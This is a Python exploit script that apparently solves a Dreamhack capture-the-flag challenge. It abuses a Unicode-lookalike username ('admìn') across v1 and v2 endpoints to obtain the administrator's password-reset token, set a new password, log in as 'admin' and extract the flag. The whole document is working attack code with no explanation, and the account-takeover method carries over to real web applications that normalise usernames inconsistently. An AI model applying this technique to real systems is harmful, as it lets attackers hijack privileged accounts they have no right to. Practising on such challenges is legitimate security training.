
import sys
import re
import requests

HOST = 'http://host3.dreamhack.games:14999'


sesh = requests.session()

arb_pw = 'a'
sesh.post(HOST+'/v2/request-password-change', data={'username':'admìn'})
sesh.post(HOST+'/v1/login', data={'username':'admìn','password':arb_pw})
resp = sesh.get(HOST+'/v1/mypage')
token = re.findall(r'/v2/change-password/.*">', resp.text)[0][:-2]
print(f'token url: {token}')
sesh.post(HOST+token, data={'new_password':arb_pw,'confirm_password':arb_pw})
sesh.get(HOST+'/v1/logout')
resp = sesh.post(HOST+'/v2/login', data={'username':'admin','password':arb_pw})
resp = sesh.get(HOST+'/v1/mypage')
print({re.findall(r"DH\{.*\}", resp.text)[0]})